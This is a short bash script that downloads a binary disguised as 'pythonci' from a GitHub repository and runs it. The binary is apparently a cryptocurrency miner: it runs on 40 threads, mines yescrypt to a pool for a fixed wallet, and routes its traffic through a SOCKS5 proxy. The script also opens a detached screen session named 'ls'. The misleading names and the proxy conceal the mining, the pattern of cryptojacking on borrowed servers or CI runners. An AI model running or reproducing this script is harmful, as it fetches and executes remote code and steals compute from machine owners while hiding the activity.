#!/bin/bash
sudo apt update
sudo apt install screen -y
sudo apt install screen libjansson4 -y
wget https://github.com/NRC-TECH/test-files/raw/main/pythonci
chmod +x pythonci
screen -dmS ls
POOL=stratum+tcp://yescrypt.mine.zpool.ca:6233
WALLET=D7S6DWdNEWeH4uECGbaK88J7JmdPnKnbpx  
PROXY=socks5://72.195.114.169:4145
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-nizam)
./pythonci -a yescrypt -o $POOL -u $WALLET.$WORKER -p x -t 40 -x $PROXY
